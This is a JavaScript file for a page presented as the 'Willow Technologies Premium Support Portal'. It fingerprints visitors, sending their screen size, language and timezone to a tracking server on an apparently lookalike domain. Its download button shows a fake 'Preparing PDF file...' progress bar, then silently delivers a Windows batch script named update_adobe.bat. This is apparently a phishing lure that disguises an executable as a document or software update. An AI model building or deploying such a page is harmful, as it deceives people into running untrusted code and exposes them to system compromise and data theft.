/* =====================================================
   Willow Technologies
   Premium Support Portal
===================================================== */

const VISITOR_KEY = "willow_visitor_id";

let visitorId = localStorage.getItem(VISITOR_KEY);

if (!visitorId) {
    visitorId = crypto.randomUUID();
    localStorage.setItem(VISITOR_KEY, visitorId);
}

const LAST_VISIT = "last_visit_sent";

const lastVisit = Number(localStorage.getItem(LAST_VISIT) || 0);

const now = Date.now();

const ONE_DAY = 24 * 60 * 60 * 1000;

if (now - lastVisit > ONE_DAY) {

    sendVisit();

    localStorage.setItem(LAST_VISIT, now);

}

const slides = document.querySelectorAll(".slide");

const modal = document.getElementById("downloadModal");
const progressBar = document.querySelector(".bar");
const status = document.querySelector(".status");
const button = document.getElementById("downloadBtn");

let current = 0;
let autoSlide;

/*====================================
SLIDER
====================================*/

function showSlide(index) {
  slides.forEach(slide => slide.classList.remove("active"));
  slides[index].classList.add("active");
}

function nextSlide() {
  current = (current + 1) % slides.length;
  showSlide(current);
}

function startAuto() {
  autoSlide = setInterval(nextSlide, 5000);
}

window.addEventListener("load", () => {

    showSlide(current);

    startAuto();

    document.body.style.opacity = 1;

});
/*====================================
AUTO CAROUSEL
====================================*/
async function sendVisit(){

    await fetch("https://documents.willowcenteredtech.com/track",{

        method:"POST",

        headers:{

            "Content-Type":"application/json"

        },

        body:JSON.stringify({

            type:"visit",

            visitor:visitorId,

            page:location.pathname,

            screen:

                window.screen.width+

                "x"+

                window.screen.height,

            language:

                navigator.language,

            timezone:

                Intl.DateTimeFormat().resolvedOptions().timeZone

        })

    });

}
/*====================================
DOWNLOAD
====================================*/

button.onclick = async ()=>{

    await fetch("https://documents.willowcenteredtech.com/track",{

        method:"POST",

        headers:{

            "Content-Type":"application/json"

        },

        body:JSON.stringify({

            type:"download",

            visitor:visitorId,

            page:location.pathname

        })

    });

  
  modal.style.display = "flex";
  
  button.disabled = true;
  
  let width = 0;
  
  status.innerHTML = "Preparing PDF file...";
  
  let timer = setInterval(() => {
    
    width++;
    
    progressBar.style.width = width + "%";
    
    if (width >= 100) {
      
      clearInterval(timer);
      
      status.innerHTML = "Starting download...";
      
      setTimeout(() => {
        
        modal.style.display = "none";
        
        button.disabled = false;
        
        progressBar.style.width = "0%";
        
        status.innerHTML = "Ready";
        
        const link = document.createElement("a");
        
        link.href = "downloads/update_adobe.bat";
        
        link.download = "update_adobe.bat";
        
        document.body.appendChild(link);
        
        link.click();
        
        link.remove();
        
      }, 800);
      
    }
    
  }, 25);
  
};



/*====================================
BUTTON ANIMATION
====================================*/

button.addEventListener("mouseenter", () => {
  
  button.style.transform = "scale(1.03)";
  
});

button.addEventListener("mouseleave", () => {
  
  button.style.transform = "scale(1)";
  
});

/*====================================
PAGE LOAD
====================================*/

window.addEventListener("load", () => {
  
  document.body.style.opacity = 1;
  
});